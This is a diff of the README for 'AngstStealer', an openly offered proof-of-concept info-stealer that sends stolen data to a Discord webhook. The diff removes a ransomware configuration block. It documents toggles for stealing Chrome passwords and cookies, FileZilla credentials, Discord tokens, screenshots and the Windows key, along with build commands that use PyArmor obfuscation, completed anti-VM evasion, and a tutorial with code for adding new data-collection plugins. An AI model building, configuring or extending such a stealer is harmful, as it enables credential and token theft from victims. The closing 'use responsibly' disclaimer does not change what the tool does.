@@ -20,42 +20,91 @@ AngstStealer is a POC malware which is designed to highlight and utilize Discord
 ```
 CONFIG = {
     "webhook" : "",
-    "chrome" : True,
-    "filezilla":False,
-    "userdata":True,
-    "discord":True,
-    "ransomware" : {
-        "enabled" : False,
-        "target_dir" : "C:\\Users\\testuser", #remove the testuser at the end
-        "extenstion" : ".angst",
-        "btcAddy" : "",
-        "email" : "demo.tmpacc12@gmail.com"
+    "software": {
+        "chrome" : True,
+        "chromecookies": True,
+        "filezilla": True,
+        "discord": True,
+        "screenshot": True,
+        "windows": True
     }
 }
+
 ```
 webhook -> The discord webhook link which you want it to use. </br>
 chrome -> If it should include chrome passwords </br>
 filezilla -> Should it include possible saved filezilla passwords</br>
-userdata -> Give information about your victim </br>
+windows -> Give information about your victim & includes the windows key</br>
 discord -> Steal discord tokens</br>
-ransomware -> If enabled is set to `True` then have enabled the ransomware module. The target_dir is the directory in which you want it to encrypt. The ransomware extenstion setting just sets the output file extenstion, in this case its just `.angst`. The btcAddy and email are just options which you can toss in to be included in the ransomware note.</br>
+screenshot -> takes a screenshot</br>
 6. Run one of the following commands listed below, it is worth noting that pyarmor will sometimes corrupt the executable so if you plan on using the pyarmor command you should test it locally to make sure it works.</br>
 `PYINSTALLER: pyinstaller --onefile --hidden-import=pkg_resources.py2_warn angst.py`</br>
 `PYARMOR: pyarmor pack -e " --onefile --hidden-import=pkg_resources.py2_warn" angst.py`</br>
 
 ### Demo
-Here is a screenshot of what will be sent through the discord webhook once it is ran. The reason why not windows activation key is included is due to it being run inside a virtual machine thats not activated.
+Example of how the dump folder might look.
 <p align="center">
-  <img width="560" height="300" src="https://botting.is-ne.at/H5OJTL.png">
+  <img width="560" height="300" src="https://i.imgur.com/56vt3pL.png">
+</p>
+<p align="center">
+  <img width="560" height="300" src="https://i.imgur.com/jfURfLb.png">
+</p>
+<p align="center">
+  <img width="560" height="300" src="https://i.imgur.com/JeYJ9tm.png">
 </p>
 
 ### To Do List
-- [ ] Add cookie support (just got lazy and forgot)
+- [x] Add cookie support (just got lazy and forgot)
 - [ ] Add more browsers
-- [ ] Implement some anti-vm tricks.
+- [x] Implement some anti-vm tricks.
 - [ ] Add more plugins
 
-If you would like to help with something, writing plugins for Angst would be a pretty big help.
+### Adding Plugins
+Adding custom plugins is incredibly easy, here is a short example of how you make and integrate your own custom plugin for Angst:
+
+1. First off you will want to create your plugin preferably in your plugins folder. The plugin can have as many function as needed, the example I provided below has one function called retrieve_data which will retrieve our sensitive data. Our dump function is needed for proper plugin integration because this is how all the functions know to dump there data.
+```python
+import requests
+
+class ExamplePlugin(object):
+	def __init__(self):
+		self.sensitive_data = ""
+
+	def retrieve_data(self):
+		view_website = requests.get("https://api.ipify.org")
+		self.sensitve_data = view_website.text
+
+	def dump(self):
+		self.retrieve_data()
+		return self.sensitive_data
+	
+```
+2. Next we want to add our example function to our main file which is `angst.py` in our `angst.py` do 
+```from plugins.exampleplugin import ExamplePlugin```
+change your import name on whatever you named your file and whatever you called the plugin class. 
+3. Lastly we want to add it to our `config["software"]` and the `self.plugins` as show below.
+```
+    "software": {
+        "chrome" : True,
+        "chromecookies": True,
+        "filezilla": True,
+        "discord": True,
+        "screenshot": True,
+        "windows": True
+    }
+```
+```
+self.plugins = {
+            "chrome": Chrome(),
+            "chromecookies": Cookies(),
+            "filezilla": Filezilla(),
+            "discord": Discord(),
+            "screenshot": Screenshot(),
+            "windows": Windows()
+        }
+```
+Make sure you use the exact same name when you put it under the config and self.plugins since it is case sensitive.
+
 
 ### Additional
 Use this responsibly, I made this just as a demonstration of a POC. The fact that Discord still hasn't implemented any safegaurds or preventive measures when it comes to something like this is kind've embarrasing. Regardless though, using this without the consent of the computer owner is illegal.
